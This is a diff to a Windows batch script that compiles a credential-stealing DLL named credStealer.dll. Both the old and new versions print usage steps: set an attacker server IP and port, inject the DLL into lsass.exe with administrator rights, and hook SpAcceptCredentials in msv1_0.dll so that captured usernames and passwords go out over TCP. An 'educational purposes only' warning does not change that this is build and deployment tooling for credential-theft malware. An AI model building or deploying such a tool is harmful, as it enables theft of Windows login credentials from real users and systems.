@@ -5,8 +5,7 @@ REM Check if Visual Studio Developer Command Prompt is available
 where cl >nul 2>&1
 if %errorlevel% neq 0 (
     echo Visual Studio Developer Command Prompt not found.
-    echo Please run this from a Developer Command Prompt or set up the environment.
-    echo You can also use: "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
+    echo Please run this from a Developer Command Prompt.
     pause
     exit /b 1
 )
@@ -28,11 +27,31 @@ REM Compile the DLL
 echo [*] Compiling credStealer.dll...
 cl /LD credStealer.cpp /Fe:credStealer.dll /link /DEF:credStealer.def ws2_32.lib
 
-REM Store the build result
-set BUILD_SUCCESS=0
-if exist credStealer.dll set BUILD_SUCCESS=1
+REM Check if build was successful
+if exist credStealer.dll (
+    echo.
+    echo [+] BUILD SUCCESSFUL! credStealer.dll created.
+    echo.
+    echo [*] File information:
+    for %%A in (credStealer.dll) do echo [*] Size: %%~zA bytes
+    for %%A in (credStealer.dll) do echo [*] Created: %%~tA
+    echo.
+    echo [*] Next steps:
+    echo [*] 1. Change SERVER_IP and SERVER_PORT in credStealer.cpp
+    echo [*] 2. Inject this DLL into lsass.exe process (requires admin privileges)
+    echo [*] 3. The DLL will hook SpAcceptCredentials in msv1_0.dll
+    echo [*] 4. Credentials sent via TCP to your server (username:password format)
+    echo.
+    echo [WARNING] This tool is for educational purposes only!
+    echo [WARNING] Use only in authorized testing environments!
+) else (
+    echo.
+    echo [-] BUILD FAILED!
+    echo [-] credStealer.dll was not created.
+    echo [-] Check the error messages above.
+)
 
-REM Clean up intermediate files (keep only the final DLL)
+REM Clean up intermediate files (but keep the DLL if it exists)
 echo [*] Cleaning up intermediate files...
 if exist *.obj del /q *.obj
 if exist *.exp del /q *.exp
@@ -42,41 +61,6 @@ if exist *.ilk del /q *.ilk
 if exist *.idb del /q *.idb
 if exist *.tmp del /q *.tmp
 if exist *.log del /q *.log
-echo [*] Build artifacts cleaned up.
-
-REM Check build result
-if %BUILD_SUCCESS% equ 1 (
-    echo.
-    echo [+] Build successful! credStealer.dll created.
-    echo.
-    echo [*] File information:
-    for %%A in (credStealer.dll) do echo [*] Size: %%~zA bytes
-    for %%A in (credStealer.dll) do echo [*] Created: %%~tA
-    echo.
-    echo [*] Usage instructions:
-    echo [*] 1. Change SERVER_IP and SERVER_PORT in credStealer.cpp
-    echo [*] 2. Inject this DLL into lsass.exe process (requires admin privileges)
-    echo [*] 3. The DLL will hook SpAcceptCredentials in msv1_0.dll
-    echo [*] 4. Credentials sent via TCP to your server (username:password format)
-    echo.
-    echo [*] Troubleshooting:
-    echo [*] - Ensure you're running as Administrator
-    echo [*] - Check if LSASS protection is enabled (RunAsPPL)
-    echo [*] - Verify the DLL is compiled for x64 architecture
-    echo.
-    echo [WARNING] This tool is for educational purposes only!
-    echo [WARNING] Use only in authorized testing environments!
-) else (
-    echo.
-    echo [-] Build failed!
-    echo [-] Check the error messages above.
-    echo.
-    echo [*] Common build issues:
-    echo [*] - Missing Visual Studio Developer Command Prompt
-    echo [*] - Missing Windows SDK
-    echo [*] - Incorrect include paths
-    echo [*] - Syntax errors in source code
-    echo [*] - Header conflicts (winsock.h vs winsock2.h)
-)
+echo [*] Cleanup complete.
 
 pause 
